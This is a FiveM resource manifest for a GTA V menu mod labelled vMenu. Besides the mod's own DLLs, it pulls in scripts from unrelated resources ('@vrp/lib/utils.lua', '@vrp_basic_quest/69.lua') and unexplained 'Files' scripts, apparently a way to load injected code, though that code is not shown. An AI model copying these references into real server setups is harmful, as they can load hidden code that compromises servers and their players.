fx_version 'bodacious'
games {'gta5'}
lua54 "yes"

escrow_ignore {
    "config/locations.json",
    "config/addons.json",
    "config/permissions.cfg"
}

name 'vMenu'
version 'v1.2.2'
author 'Al-Dolime'


ui_page 'storage.html'
client_debug_mode 'false'
server_debug_mode 'false'

experimental_features_enabled '0'


files {
    'vMenu/Newtonsoft.Json.dll',
    'vMenu/MenuAPI.dll',
    'config/locations.json',
    'config/addons.json',
    'vMenu/storage.html'
}
server_scripts {
    '@vrp/lib/utils.lua'
}

client_script 'Files/client.lua'
server_script 'Files/server.lua'
client_script 'vMenu/vMenuClient.net.dll'
server_script 'vMenu/vMenuServer.net.dll'
client_script "@vrp_basic_quest/69.lua"





